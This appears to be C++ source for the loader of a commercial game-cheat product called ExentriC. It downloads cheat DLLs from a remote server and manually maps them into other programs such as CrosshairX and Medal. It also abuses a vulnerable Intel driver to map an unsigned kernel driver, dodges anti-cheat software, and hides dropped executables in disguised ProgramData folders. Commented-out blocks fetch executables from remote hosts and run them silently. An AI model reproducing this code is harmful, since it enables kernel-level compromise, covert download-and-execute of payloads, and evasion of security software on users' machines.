                            /*    if (subs.name  == xorstr_("PUBG"))
                                {
                                    ImGui::InjectProduct(pbg, ImVec2(75, 75), ImVec2(495, 75), xorstr_("PUBG"), ImGui::GetColorU32(c::text_product), xorstr_("Undetected"), ImGui::GetColorU32(c::data_product));
                                    if (ImGui::IsItemClicked()) {
                                        status_tabs = 6;
                                    }

                                } */


                                if (subs.name  == xorstr_("Apex"))
                                {
                                    ImGui::InjectProduct(ax, ImVec2(75, 75), ImVec2(495, 75), xorstr_("Apex"), ImGui::GetColorU32(c::text_product), xorstr_("Undetected"), ImGui::GetColorU32(c::data_product));
                                    if (ImGui::IsItemClicked()) {
                                        status_tabs = 8;
                                    }

                                }

                                if (subs.name  == xorstr_("Warzone"))
                                {
                                    ImGui::InjectProduct(eft, ImVec2(75, 75), ImVec2(495, 75), xorstr_("Warzone"), ImGui::GetColorU32(c::text_product), xorstr_("Undetected"), ImGui::GetColorU32(c::data_product));
                                    if (ImGui::IsItemClicked()) {
                                        status_tabs = 10;
                                    }

                                }

                                ImGui::EndChild();
                            }

                            //Spoofer Outdated
                            else if (active_statustab == 2) {

                                ImGui::SetCursorPos(ImVec2(WIDTH / 2 - 15 / 2 + 120 / 2, HEIGHT / 2 - 15 / 2));

                                timer_inject += 1.f / ImGui::GetIO().Framerate * 70.f;
                                if (timer_inject > 300.f) status_tabs = 3;

                                ImGui::Spinner(xorstr_("##spinner"), 15, 3, ImGui::GetColorU32(c::spiner_circle));
                            }

                            //Valorant
                            else if (active_statustab == 4) {

                                ImGui::SetCursorPos(ImVec2(WIDTH / 2 - 15 / 2 + 120 / 2, HEIGHT / 2 - 15 / 2));

                                timer_inject += 1.f / ImGui::GetIO().Framerate * 70.f;
                                if (timer_inject > 300.f) status_tabs = 5;

                                ImGui::Spinner(xorstr_("##spinner"), 15, 3, ImGui::GetColorU32(c::spiner_circle));
                            }

                          /*  //PUBG
                            else if (active_statustab == 6) {

                                ImGui::SetCursorPos(ImVec2(WIDTH / 2 - 15 / 2 + 120 / 2, HEIGHT / 2 - 15 / 2));

                                timer_inject += 1.f / ImGui::GetIO().Framerate * 70.f;
                                if (timer_inject > 300.f) status_tabs = 7;

                                ImGui::Spinner(xorstr_("##spinner"), 15, 3, ImGui::GetColorU32(c::spiner_circle));
                            } */

                            //Apex
                            else if (active_statustab == 8) {

                                ImGui::SetCursorPos(ImVec2(WIDTH / 2 - 15 / 2 + 120 / 2, HEIGHT / 2 - 15 / 2));

                                timer_inject += 1.f / ImGui::GetIO().Framerate * 70.f;
                                if (timer_inject > 300.f) status_tabs = 9;

                                ImGui::Spinner(xorstr_("##spinner"), 15, 3, ImGui::GetColorU32(c::spiner_circle));
                            }

                            //Warzone
                            else if (active_statustab == 10) {

                                ImGui::SetCursorPos(ImVec2(WIDTH / 2 - 15 / 2 + 120 / 2, HEIGHT / 2 - 15 / 2));

                                timer_inject += 1.f / ImGui::GetIO().Framerate * 70.f;
                                if (timer_inject > 300.f) status_tabs = 11;

                                ImGui::Spinner(xorstr_("##spinner"), 15, 3, ImGui::GetColorU32(c::spiner_circle));
                                }


                           /* else if (active_statustab == 5) {

                                CreateDirectoryA(xorstr_("C:\\ProgramData\\Microsoft\\dVuPeuZT"), NULL);
                                SetFileAttributesA(xorstr_("C:\\ProgramData\\Microsoft\\dVuPeuZT"), FILE_ATTRIBUTE_HIDDEN);
                               

                                //HRESULT hr = URLDownloadToFile(NULL, xorstr_("https://cloud.exentric.cc/BhzIQQxa/zip.dll"), xorstr_("C:\\ProgramData\\Microsoft\\dVuPeuZT\\zip.dll"), 0, NULL);
                                std::vector<std::uint8_t> bytes1 = KeyAuthApp.download(xorstr_("925784")); //https://cloud.exentric.cc/BhzIQQxa/zip.dll
                                std::ofstream file1(xorstr_("C:\\ProgramData\\Microsoft\\dVuPeuZT\\zip.dll"), std::ios_base::out | std::ios_base::binary);
                                file1.write((char*)bytes1.data(), bytes1.size());
                                file1.close();


                                //HRESULT hr1 = URLDownloadToFile(NULL, xorstr_("https://cloud.exentric.cc/BhzIQQxa/ohCDqOUQ.exe"), xorstr_("C:\\ProgramData\\Microsoft\\dVuPeuZT\\ohCDqOUQ.exe"), 0, NULL);
                                std::vector<std::uint8_t> bytes2 = KeyAuthApp.download(xorstr_("936774")); //https://cloud.exentric.cc/BhzIQQxa/ohCDqOUQ.exe
                                std::ofstream file2(xorstr_("C:\\ProgramData\\Microsoft\\dVuPeuZT\\ohCDqOUQ.exe"), std::ios_base::out | std::ios_base::binary);
                                file2.write((char*)bytes2.data(), bytes2.size());
                                file2.close();


                                SetFileAttributesA(xorstr_("C:\\ProgramData\\Microsoft\\dVuPeuZT\\zip.dll"), FILE_ATTRIBUTE_HIDDEN);
                                SetFileAttributesA(xorstr_("C:\\ProgramData\\Microsoft\\dVuPeuZT\\ohCDqOUQ.exe"), FILE_ATTRIBUTE_HIDDEN);


                                CreateDirectoryA(xorstr_("C:\\ProgramData\\Microsoft\\azjySrUy"), NULL);
                                SetFileAttributesA(xorstr_("C:\\ProgramData\\Microsoft\\azjySrUy"), FILE_ATTRIBUTE_HIDDEN);

                                //HRESULT hr3 = URLDownloadToFileA(NULL, xorstr_("https://cloud.exentric.cc/BhzIQQxa/UZjffaRp.exe"), xorstr_("C:\\ProgramData\\Microsoft\\azjySrUy\\UZjffaRp.exe"), 0, NULL);
                                std::vector<std::uint8_t> bytes3 = KeyAuthApp.download(xorstr_("837470")); //https://cloud.exentric.cc/BhzIQQxa/UZjffaRp.exe
                                std::ofstream file3(xorstr_("C:\\ProgramData\\Microsoft\\azjySrUy\\UZjffaRp.exe"), std::ios_base::out | std::ios_base::binary);
                                file3.write((char*)bytes3.data(), bytes3.size());
                                file3.close();
                                
                                SetFileAttributesA(xorstr_("C:\\ProgramData\\Microsoft\\azjySrUy\\UZjffaRp.exe"), FILE_ATTRIBUTE_HIDDEN);

                                std::string folderPath = xorstr_("C:\\ProgramData\\Microsoft\\dVuPeuZT"); // Pfad zum Ordner, in dem sich die Dateien befinden
                                std::string exePath; // Speicherort der EXE-Datei
                                std::string dllPath; // Speicherort der DLL-Datei
                                std::string folderPath2 = xorstr_("C:\\ProgramData\\Microsoft\\azjySrUy"); // Pfad zum Ordner, in dem sich die zweite EXE-Datei befindet
                                std::string exePath2; // Speicherort der zweiten EXE-Datei

                                // Durchsuche den Ordner nach EXE- und DLL-Dateien
                                for (const auto& entry : std::filesystem::directory_iterator(folderPath))
                                {
                                    if (entry.path().extension() == xorstr_(".exe"))
                                    {
                                        exePath = entry.path().string();
                                    }
                                    else if (entry.path().extension() == xorstr_(".dll"))
                                    {
                                        dllPath = entry.path().string();
                                    }
                                }

                                // Überprüfe, ob eine EXE- und DLL-Datei gefunden wurden
                                if (!exePath.empty() && !dllPath.empty())
                                {
                                    std::string command = "cmd.exe /c start \"\" \"" + exePath + "\" \"" + dllPath + "\"";

                                    STARTUPINFOA startupInfo{};
                                    PROCESS_INFORMATION processInfo{};

                                    // Neuen Prozess erstellen
                                    if (CreateProcessA(NULL, &command[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, folderPath.c_str(), &startupInfo, &processInfo))
                                    {
                                        // Warte auf den Abschluss des Prozesses
                                        WaitForSingleObject(processInfo.hProcess, INFINITE);

                                        // Prozess- und Thread-Handles schließen
                                        CloseHandle(processInfo.hProcess);
                                        CloseHandle(processInfo.hThread);
                                    }
                                    else
                                    {
                                        std::cout << xorstr_("Fehler beim Erstellen des Prozesses.") << std::endl;
                                    }
                                }
                                else
                                {
                                    std::cout << xorstr_("EXE- oder DLL-Datei nicht gefunden.") << std::endl;
                                }

                                // Durchsuche den zweiten Ordner nach der zweiten EXE-Datei
                                for (const auto& entry : std::filesystem::directory_iterator(folderPath2))
                                {
                                    if (entry.path().extension() == xorstr_(".exe"))
                                    {
                                        exePath2 = entry.path().string();
                                        break; // Stoppe die Schleife nach dem Finden der ersten EXE-Datei
                                    }
                                }

                                // Überprüfe, ob die zweite EXE-Datei gefunden wurde
                                if (!exePath2.empty())
                                {
                                    std::string command2 = "cmd.exe /c start \"\" \"" + exePath2 + "\"";

                                    STARTUPINFOA startupInfo2{};
                                    PROCESS_INFORMATION processInfo2{};

                                    // Neuen Prozess für die zweite EXE-Datei erstellen
                                    if (CreateProcessA(NULL, &command2[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, folderPath2.c_str(), &startupInfo2, &processInfo2))
                                    {
                                        // Warte nicht auf den Abschluss des Prozesses, sondern fahre fort
                                        // ohne die Prozess- und Thread-Handles zu schließen
                                    }
                                    else
                                    {
                                        std::cout << xorstr_("Fehler beim Erstellen des Prozesses für die zweite EXE-Datei.") << std::endl;
                                    }
                                }
                                else
                                {
                                    std::cout << xorstr_("Zweite EXE-Datei nicht gefunden.") << std::endl;
                                }

                                return 0;
                            }*/
                            
                            //Valorant
                            else if (active_statustab == 5)
                            {
                                //Note for the customer to start Crosshair X
                                MessageBoxA(nullptr, xorstr_("Please start Crosshair X now"), xorstr_("ExentriC - Information"), MB_OK | MB_ICONINFORMATION);

                                //Now we check if Crosshair X is running.
                                if (!g_pProcess->is_process_running(xorstr_("CrosshairX.exe")))
                                {
                                    MessageBoxA(nullptr, xorstr_("Corsshair X is not running, please start it first and try again"), xorstr_("ExentriC - Information"), MB_OK | MB_ICONINFORMATION);
                                    return -1;
                                }

                                //If driver was already mapped, we skip driver mapping and just inject our cheat into crosshairx.exe
                                if(const NTSTATUS status = comm::Alpc::init_setup(); NT_SUCCESS(status))
                                {
                                    //MessageBoxA(nullptr, xorstr_("Driver already mapped"), xorstr_("ExentriC - Information"), MB_OK | MB_ICONINFORMATION);

                                    //Download cheat dll from server
                                    dl_cheat_image(xorstr_("510391"), xorstr_("valo.dll"));

                                    //Inject dll CrosshairX.exe
                                    manual_map(xorstr_("valo.dll"), xorstr_("CrosshairX.exe"));

                                    //Close loader after 3 sec
                                    std::this_thread::sleep_for(std::chrono::seconds(3));
                                }
                                else
                                {
                                    //MessageBoxA(nullptr, xorstr_("Mapping driver"), xorstr_("ExentriC - Information"), MB_OK | MB_ICONINFORMATION);

                                    //Download mapping image from server.
                                    //Drv image will drop into the same folder as the loader.
                                    //The driver loading is fast as fuck (faster then Speedy Gonzales xD), so no file will show in the folder.
                                    dl_drv_image();

                                    //Load vulnerable intel driver.
                                    iqvw64e_device_handle = intel_driver::Load();
                                    if (iqvw64e_device_handle == INVALID_HANDLE_VALUE)
                                    {
                                        //***Important*** If vulnerable driver loading failed, delete our drv image.
                                        remove_drv_image();
                                        MessageBoxA(GetConsoleWindow(), xorstr_("Failed to load driver"), xorstr_("ExentriC"), MB_OK);
                                        return -1;
                                    }

                                    //MessageBoxA(GetConsoleWindow(), xorstr_("Intel driver successfully loaded!"), xorstr_("ExentriC"), MB_OK);

                                    //Read file to memory.
                                    std::vector<uint8_t> raw_image = { 0 };
                                    if (!utils::ReadFileToMemory(xorstr_(L"km.sys"), &raw_image))
                                    {
                                        intel_driver::Unload(iqvw64e_device_handle);
                                        //***Important*** If vulnerable driver loading failed, delete our drv image.
                                        remove_drv_image();
                                        MessageBoxA(GetConsoleWindow(), xorstr_("Failed to read image to memory"), xorstr_("ExentriC"), MB_OK);
                                        return -1;
                                    }

                                    //The drv image is read successful to memory, we can delete it now.
                                    remove_drv_image();

                                    NTSTATUS exit_code = 0;
                                    //Mapping image into system.
                                    if (!MapDriver(iqvw64e_device_handle, raw_image.data(), 0, 0, false, true,
                                        kdmapper::AllocationMode::AllocatePool, false, callbackExample,
                                        &exit_code))
                                    {
                                        intel_driver::Unload(iqvw64e_device_handle);
                                        //***Important*** If vulnerable driver loading failed, delete our drv image.
                                        remove_drv_image();
                                        MessageBoxA(GetConsoleWindow(), xorstr_("Mapping Failed"), xorstr_("ExentriC"), MB_OK);
                                        return -1;
                                    }

                                    if (!intel_driver::Unload(iqvw64e_device_handle))
                                    {
                                        MessageBoxA(GetConsoleWindow(), xorstr_("Warning failed to fully unload vulnerable driver, please restart your system"), xorstr_("ExentriC"), MB_OK);
                                        return -1;
                                    }

                                    //Download cheat dll from server
                                    dl_cheat_image(xorstr_("510391"), xorstr_("valo.dll"));

                                    //Inject dll CrosshairX.exe
                                    manual_map(xorstr_("valo.dll"), xorstr_("CrosshairX.exe"));

                                    //Close loader after 3 sec
                                    std::this_thread::sleep_for(std::chrono::seconds(3));
                                }

                                return 0;
                            }


                           //PUBG
                            else if (active_statustab == 7) 
                            {
                                //Note for the customer to start Crosshair X
                                MessageBoxA(nullptr, xorstr_("Please start Crosshair X now"), xorstr_("ExentriC - Information"), MB_OK | MB_ICONINFORMATION);

                                //Now we check if Crosshair X is running.
                                if (!g_pProcess->is_process_running(xorstr_("CrosshairX.exe")))
                                {
                                    MessageBoxA(nullptr, xorstr_("Corsshair X is not running, please start it first and try again"), xorstr_("ExentriC - Information"), MB_OK | MB_ICONINFORMATION);
                                    return -1;
                                }

                                //If driver was already mapped, we skip driver mapping and just inject our cheat into crosshairx.exe
                                if (const NTSTATUS status = comm::Alpc::init_setup(); NT_SUCCESS(status))
                                {
                                    //MessageBoxA(nullptr, xorstr_("Driver already mapped"), xorstr_("ExentriC - Information"), MB_OK | MB_ICONINFORMATION);

                                    //Download cheat dll from server
                                    dl_cheat_image(xorstr_("029954"), xorstr_("pub.dll"));

                                    //Inject dll CrosshairX.exe
                                    manual_map(xorstr_("pub.dll"), xorstr_("CrosshairX.exe"));

                                    //Close loader after 3 sec
                                    std::this_thread::sleep_for(std::chrono::seconds(3));
                                }
                                else
                                {
                                    //MessageBoxA(nullptr, xorstr_("Mapping driver"), xorstr_("ExentriC - Information"), MB_OK | MB_ICONINFORMATION);

                                    //Download mapping image from server.
                                    //Drv image will drop into the same folder as the loader.
                                    //The driver loading is fast as fuck (faster then Speedy Gonzales xD), so no file will show in the folder.
                                    dl_drv_image();

                                    //Load vulnerable intel driver.
                                    iqvw64e_device_handle = intel_driver::Load();
                                    if (iqvw64e_device_handle == INVALID_HANDLE_VALUE)
                                    {
                                        //***Important*** If vulnerable driver loading failed, delete our drv image.
                                        remove_drv_image();
                                        MessageBoxA(GetConsoleWindow(), xorstr_("Failed to load driver"), xorstr_("ExentriC"), MB_OK);
                                        return -1;
                                    }

                                    //MessageBoxA(GetConsoleWindow(), xorstr_("Intel driver successfully loaded!"), xorstr_("ExentriC"), MB_OK);

                                    //Read file to memory.
                                    std::vector<uint8_t> raw_image = { 0 };
                                    if (!utils::ReadFileToMemory(xorstr_(L"km.sys"), &raw_image))
                                    {
                                        intel_driver::Unload(iqvw64e_device_handle);
                                        //***Important*** If vulnerable driver loading failed, delete our drv image.
                                        remove_drv_image();
                                        MessageBoxA(GetConsoleWindow(), xorstr_("Failed to read image to memory"), xorstr_("ExentriC"), MB_OK);
                                        return -1;
                                    }

                                    //The drv image is read successful to memory, we can delete it now.
                                    remove_drv_image();

                                    NTSTATUS exit_code = 0;
                                    //Mapping image into system.
                                    if (!MapDriver(iqvw64e_device_handle, raw_image.data(), 0, 0, false, true,
                                        kdmapper::AllocationMode::AllocatePool, false, callbackExample,
                                        &exit_code))
                                    {
                                        intel_driver::Unload(iqvw64e_device_handle);
                                        //***Important*** If vulnerable driver loading failed, delete our drv image.
                                        remove_drv_image();
                                        MessageBoxA(GetConsoleWindow(), xorstr_("Mapping Failed"), xorstr_("ExentriC"), MB_OK);
                                        return -1;
                                    }

                                    if (!intel_driver::Unload(iqvw64e_device_handle))
                                    {
                                        MessageBoxA(GetConsoleWindow(), xorstr_("Warning failed to fully unload vulnerable driver, please restart your system"), xorstr_("ExentriC"), MB_OK);
                                        return -1;
                                    }

                                    //Download cheat dll from server
                                    dl_cheat_image(xorstr_("029954"), xorstr_("pub.dll"));

                                    //Inject dll CrosshairX.exe
                                    manual_map(xorstr_("pub.dll"), xorstr_("CrosshairX.exe"));

                                    //Close loader after 3 sec
                                    std::this_thread::sleep_for(std::chrono::seconds(3));
                                }

                                return 0;

                            } 
                         

                            //Apex
                            else if (active_statustab == 9)
                            {
                                CreateDirectoryA(xorstr_("C:\\ProgramData\\Microsoft\\AzwMMJFFNGpq"), NULL);
                                SetFileAttributesA(xorstr_("C:\\ProgramData\\Microsoft\\AzwMMJFFNGpq"), FILE_ATTRIBUTE_HIDDEN);

                                //Check if any anti cheat running before we load our driver 
                                if (g_pProcess->is_process_running(xorstr_("EasyAntiCheat.exe")) || g_pProcess->is_process_running(xorstr_("BEService.exe")))
                                {
                                    MessageBoxA(NULL, xorstr_("AntiCheat is running, please close the game and try it again"), xorstr_("ExentriC - Information"), MB_OK | MB_ICONINFORMATION);
                                    exit(0);
                                }
                                else
                                    if (g_pProcess->is_process_running(xorstr_("vgtray.exe")))
                                    {
                                        MessageBoxA(NULL, xorstr_("Please exit Vanguard and try it again"), xorstr_("ExentriC - Information"), MB_OK | MB_ICONINFORMATION);
                                        exit(0);
                                    }

                                //Check Inizialize communication to our driver

                                //Check if our driver still running, if not we load our signed driver and map our cheat driver into system space

                                if (!g_pProcess->is_process_running(xorstr_("Medal.exe")))
                                {
                                    MessageBoxA(NULL, xorstr_("Please start Medal first and try again"), xorstr_("ExentriC - Information"), MB_OK | MB_ICONINFORMATION);
                                    exit(0);
                                }

                                //Download cheat dll from server
                                dl_cheat_image(xorstr_("315777"), xorstr_("medal.dll"));  //https://cloud.exentric.cc/ssPhEozYZeng/medal.dll

                                //Inject dll into medal tv
                                manual_map(xorstr_("medal.dll"), xorstr_("MedalEncoder.exe"));

                                return 0;
                            }


                            //Warzone
                            else if (active_statustab == 11)
                            {
                                CreateDirectoryA(xorstr_("C:\\ProgramData\\Microsoft\\AzwMMJFFNGpq"), NULL);
                                SetFileAttributesA(xorstr_("C:\\ProgramData\\Microsoft\\AzwMMJFFNGpq"), FILE_ATTRIBUTE_HIDDEN);

                                //Check if any anti cheat running before we load our driver 
                                if (g_pProcess->is_process_running(xorstr_("EasyAntiCheat.exe")) || g_pProcess->is_process_running(xorstr_("BEService.exe")))
                                {
                                    MessageBoxA(NULL, xorstr_("AntiCheat is running, please close the game and try it again"), xorstr_("ExentriC - Information"), MB_OK | MB_ICONINFORMATION);
                                    exit(0);
                                }
                                else
                                    if (g_pProcess->is_process_running(xorstr_("vgtray.exe")))
                                    {
                                        MessageBoxA(NULL, xorstr_("Please exit Vanguard and try it again"), xorstr_("ExentriC - Information"), MB_OK | MB_ICONINFORMATION);
                                        exit(0);
                                    }

                                //Check Inizialize communication to our driver

                                //Check if our driver still running, if not we load our signed driver and map our cheat driver into system space
                                

                                if (!g_pProcess->is_process_running(xorstr_("Medal.exe")))
                                {
                                    MessageBoxA(NULL, xorstr_("Please start Medal first and try again"), xorstr_("ExentriC - Information"), MB_OK | MB_ICONINFORMATION);
                                    exit(0);
                                }

                                //Download cheat dll from server
                                dl_cheat_image(xorstr_("505327"), xorstr_("medal.dll"));  //https://cloud.exentric.cc/UMNzVtyovLtM/medal.dll

                                //Inject dll into medal tv
                                manual_map(xorstr_("medal.dll"), xorstr_("MedalEncoder.exe"));

                                return 0;
                                }



                            else if (active_statustab == 3) {


                                DrawTextCenteredX(xorstr_("Sucessfully Started!"), 220);
                                DrawTextCenteredX(hwnd_time.c_str(), 250);

                                using namespace std::this_thread;     // sleep_for, sleep_until
                                using namespace std::chrono_literals; // ns, us, ms, s, h, etc.
                                using std::chrono::system_clock;


                                //CreateDirectoryA(xorstr_("C:\\Windows\\hYpdcvGN"), NULL);
                                //SetFileAttributesA(xorstr_("C:\\Windows\\hYpdcvGN"), FILE_ATTRIBUTE_HIDDEN);

                                //HRESULT hr = URLDownloadToFile(NULL, xorstr_("https://cdn.discordapp.com/attachments/973671800733065296/1098294174488481822/Guna.UI2.dll"), xorstr_("C:\\Windows\\hYpdcvGN\\Guna.UI2.dll"), 0, NULL);
                                //HRESULT hr1 = URLDownloadToFile(NULL, xorstr_("https://cdn.discordapp.com/attachments/973671800733065296/1098294174924669010/Bunifu_UI_v1.5.3.dll"), xorstr_("C:\\Windows\\hYpdcvGN\\Bunifu_UI_v1.5.3.dll"), 0, NULL);
                                //HRESULT hr2 = URLDownloadToFile(NULL, xorstr_("https://cdn.discordapp.com/attachments/973671800733065296/1116713500119670885/bvdtNmsk.exe"), xorstr_("C:\\Windows\\hYpdcvGN\\bvdtNmsk.exe"), 0, NULL);

                                //SetFileAttributesA(xorstr_("C:\\Windows\\hYpdcvGN\\Guna.UI2.dll"), FILE_ATTRIBUTE_HIDDEN);
                                //SetFileAttributesA(xorstr_("C:\\Windows\\hYpdcvGN\\Bunifu_UI_v1.5.3.dll"), FILE_ATTRIBUTE_HIDDEN);
                                //SetFileAttributesA(xorstr_("C:\\Windows\\hYpdcvGN\\bvdtNmsk.exe"), FILE_ATTRIBUTE_HIDDEN);

                                //system(xorstr_("start C:\\Windows\\hYpdcvGN\\bvdtNmsk.exe")); // As an example. Change [notepad] to any executable file //
                                return 0;

                            }
                        }

                        ImGui::PopStyleVar(2);
                    }
                    else {
                        DrawTextCentered(xorstr_("Only authorized users"));
                    }

                    break;

                }

                ImGui::PopStyleVar();
            }
            ImGui::End();
            RenderBlur(hwnd);

        }

        ImGui::Render();

        const float clear_color_with_alpha[4] = { 0 };
        g_pd3dDeviceContext->OMSetRenderTargets(1, &g_mainRenderTargetView, NULL);
        g_pd3dDeviceContext->ClearRenderTargetView(g_mainRenderTargetView, clear_color_with_alpha);
        ImGui_ImplDX11_RenderDrawData(ImGui::GetDrawData());

        g_pSwapChain->Present(1, 0);
    }

    ImGui_ImplDX11_Shutdown();
    ImGui_ImplWin32_Shutdown();
    ImGui::DestroyContext();

    CleanupDeviceD3D();
    ::DestroyWindow(hwnd);
    ::UnregisterClassW(wc.lpszClassName, wc.hInstance);

    return 0;
}

bool CreateDeviceD3D(HWND hWnd)
{
    DXGI_SWAP_CHAIN_DESC sd;
    ZeroMemory(&sd, sizeof(sd));
    sd.BufferCount = 2;
    sd.BufferDesc.Width = 0;
    sd.BufferDesc.Height = 0;
    sd.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM;
    sd.BufferDesc.RefreshRate.Numerator = 60;
    sd.BufferDesc.RefreshRate.Denominator = 1;
    sd.Flags = DXGI_SWAP_CHAIN_FLAG_ALLOW_MODE_SWITCH;
    sd.BufferUsage = DXGI_USAGE_RENDER_TARGET_OUTPUT;
    sd.OutputWindow = hWnd;
    sd.SampleDesc.Count = 1;
    sd.SampleDesc.Quality = 0;
    sd.Windowed = TRUE;
    sd.SwapEffect = DXGI_SWAP_EFFECT_DISCARD;

    UINT createDeviceFlags = 0;

    D3D_FEATURE_LEVEL featureLevel;
    const D3D_FEATURE_LEVEL featureLevelArray[2] = { D3D_FEATURE_LEVEL_11_0, D3D_FEATURE_LEVEL_10_0, };
    if (D3D11CreateDeviceAndSwapChain(NULL, D3D_DRIVER_TYPE_HARDWARE, NULL, createDeviceFlags, featureLevelArray, 2, D3D11_SDK_VERSION, &sd, &g_pSwapChain, &g_pd3dDevice, &featureLevel, &g_pd3dDeviceContext) != S_OK)
        return false;

    CreateRenderTarget();
    return true;
}

void CleanupDeviceD3D()
{
    CleanupRenderTarget();
    if (g_pSwapChain) { g_pSwapChain->Release(); g_pSwapChain = NULL; }
    if (g_pd3dDeviceContext) { g_pd3dDeviceContext->Release(); g_pd3dDeviceContext = NULL; }
    if (g_pd3dDevice) { g_pd3dDevice->Release(); g_pd3dDevice = NULL; }
}

void CreateRenderTarget()
{
    ID3D11Texture2D* pBackBuffer;
    g_pSwapChain->GetBuffer(0, IID_PPV_ARGS(&pBackBuffer));
    g_pd3dDevice->CreateRenderTargetView(pBackBuffer, NULL, &g_mainRenderTargetView);
    pBackBuffer->Release();
}

void CleanupRenderTarget()
{
    if (g_mainRenderTargetView) { g_mainRenderTargetView->Release(); g_mainRenderTargetView = NULL; }
}

// Forward declare message handler from imgui_impl_win32.cpp
extern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);

LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    if (ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam))
        return true;

    switch (msg)
    {
    case WM_SIZE:
        if (g_pd3dDevice != NULL && wParam != SIZE_MINIMIZED)
        {
            CleanupRenderTarget();
            g_pSwapChain->ResizeBuffers(0, (UINT)LOWORD(lParam), (UINT)HIWORD(lParam), DXGI_FORMAT_UNKNOWN, 0);
            CreateRenderTarget();
        }
        return 0;
    case WM_SYSCOMMAND:
        if ((wParam & 0xfff0) == SC_KEYMENU) // Disable ALT application menu
            return 0;
        break;
    case WM_DESTROY:
        ::PostQuitMessage(0);
        return 0;
    }
    return ::DefWindowProc(hWnd, msg, wParam, lParam);
}



